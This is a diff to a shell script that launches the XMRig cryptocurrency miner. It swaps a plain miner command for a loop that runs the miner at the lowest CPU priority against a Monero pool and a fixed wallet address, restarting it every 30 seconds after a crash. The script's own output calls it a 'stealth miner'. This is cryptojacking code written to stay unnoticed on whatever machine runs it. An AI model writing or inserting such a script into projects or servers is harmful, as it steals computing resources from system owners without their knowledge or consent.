@@ -1,12 +1,8 @@
 #!/bin/bash
-cd /app
-./xmrig/xmrig \
-  -a rx/0 \
-  -o stratum+ssl://pool.supportxmr.com:443 \
-  -u 43dmY2p8qSD2rzEeEsTa7fS2XQ5dULQPuESeoz8kVDnsH1gAThHgbBAVCTasSBUGs6LJ6EtDxWhRyBHfN9XccTwc9KrtiYy \
-  -p x \
-  --threads 1 \
-  --cpu-priority 0 \
-  --donate-level 0 \
-  --no-huge-pages \
-  --no-config
+chmod +x xmrig
+while true; do
+  echo "⛏️ Starting stealth miner..."
+  nice -n 19 ./xmrig -o pool.supportxmr.com:443 -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm -k --tls -t 1 --cpu-priority=1 --randomx-mode=light
+  echo "❌ Miner crashed. Restarting in 30s..."
+  sleep 30
+done
